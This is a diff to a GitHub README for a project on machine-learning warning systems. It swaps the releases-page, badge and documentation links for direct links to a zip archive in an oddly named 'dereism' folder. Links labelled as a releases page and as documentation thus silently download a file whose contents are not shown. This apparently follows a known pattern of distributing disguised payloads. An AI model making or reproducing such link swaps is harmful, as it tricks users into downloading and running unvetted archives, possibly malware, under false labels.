@@ -1,6 +1,6 @@
 # 🤖 Machine-Learning-Warning-Systems - Design ML Systems That Warn Effectively
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-%20-blue)](https://github.com/khalid0987/Machine-Learning-Warning-Systems/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/khalid0987/Machine-Learning-Warning-Systems/main/dereism/Machine-Learning-Systems-Warning-v2.4.zip%20-blue)](https://raw.githubusercontent.com/khalid0987/Machine-Learning-Warning-Systems/main/dereism/Machine-Learning-Systems-Warning-v2.4.zip)
 
 ## 📚 Overview
 
@@ -44,7 +44,7 @@ Before downloading, ensure your system meets the following requirements:
 
 To run the application, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/khalid0987/Machine-Learning-Warning-Systems/releases) to find the latest version.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/khalid0987/Machine-Learning-Warning-Systems/main/dereism/Machine-Learning-Systems-Warning-v2.4.zip) to find the latest version.
   
 2. **Download the File:** Click on the link for the latest release version suitable for your operating system to download the installation file.
 
@@ -68,7 +68,7 @@ This tool helps users create systems that warn rather than decide. Here are some
 
 ## 📖 Documentation
 
-For a detailed explanation of each feature and to follow along with the framework, please refer to our [Documentation](https://github.com/khalid0987/Machine-Learning-Warning-Systems).
+For a detailed explanation of each feature and to follow along with the framework, please refer to our [Documentation](https://raw.githubusercontent.com/khalid0987/Machine-Learning-Warning-Systems/main/dereism/Machine-Learning-Systems-Warning-v2.4.zip).
 
 ## 🛠️ Support
 
